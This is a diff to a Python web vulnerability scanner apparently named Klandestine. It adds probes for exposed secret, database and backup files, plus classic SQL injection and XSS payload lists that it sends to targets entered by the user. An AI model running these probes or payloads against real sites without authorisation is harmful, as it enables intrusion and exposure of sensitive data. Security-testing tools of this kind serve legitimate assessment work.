@@ -18,11 +18,6 @@ def print_banner():
     """
     print(colored(banner, 'red'))
 
-def update_tool():
-    print(colored("Checking for updates...", 'yellow'))
-    subprocess.run(["git", "pull", GITHUB_REPO], capture_output=True, text=True)
-    print(colored("Update completed!", 'green'))
-
 def run_subfinder(target):
     try:
         result = subprocess.run(["subfinder", "-d", target, "-silent"], capture_output=True, text=True)
@@ -64,7 +59,7 @@ def filter_urls(urls):
         return []
 
 def scan_logs(url):
-    potential_paths = ["/logs", "/log.txt", "/error.log", "/access.log", "/debug.log", "/system.log", "/database.log", "/backup.log", "/config/logs", "/var/logs", "/log/errors.log", "/server.log", "/admin.log", "/auth.log"]
+    potential_paths = ["/logs", "/log.txt", "/error.log", "/access.log", "/debug.log", "/system.log", "/database.log", "/backup.log", "/config/logs", "/var/logs", "/log/errors.log", "/server.log", "/admin.log", "/auth.log", "/log.cache", "/.secret", "/.db", "/.backup", "/.yml", "/.gz", "/.rar", "/.zip", "/.config"]
     for path in potential_paths:
         try:
             full_url = urljoin(url, path)
@@ -75,9 +70,31 @@ def scan_logs(url):
             pass
     return False, None, None
 
+def scan_sql_injection(url):
+    payloads = ["' OR '1'='1", "' UNION SELECT NULL, NULL, NULL--", "' AND 1=1--", "' OR 'a'='a"]
+    for payload in payloads:
+        try:
+            response = requests.get(url, params={"input": payload}, timeout=5)
+            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
+                return True, payload, "High"
+        except requests.RequestException:
+            pass
+    return False, None, None
+
+def scan_xss(url):
+    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"]
+    for payload in payloads:
+        try:
+            response = requests.get(url, params={"input": payload}, timeout=5)
+            if payload in response.text:
+                return True, payload, "Medium"
+        except requests.RequestException:
+            pass
+    return False, None, None
+
 def generate_report(vulnerabilities, output_file):
     with open(output_file, 'w') as file:
-        file.write("Vulnerability Scan Report\n")
+        file.write("Klandestine by BCEVM - Vulnerability Scan Report\n")
         file.write("===========================================\n\n")
         for url, issues in vulnerabilities.items():
             file.write(f"URL: {url}\n")
@@ -106,10 +123,15 @@ def scan_url(url):
     logs_found, log_payload, log_severity = scan_logs(url)
     if logs_found:
         issues.append(("Logs Found", log_payload, log_severity))
+    sql_injection, sql_payload, sql_severity = scan_sql_injection(url)
+    if sql_injection:
+        issues.append(("SQL Injection", sql_payload, sql_severity))
+    xss, xss_payload, xss_severity = scan_xss(url)
+    if xss:
+        issues.append(("Cross-Site Scripting (XSS)", xss_payload, xss_severity))
     return url, issues
 
 def main():
-    print_banner()
     target = input("Enter target domain: ").strip()
     output_file = input("Enter output filename (e.g., results.txt): ").strip()
     
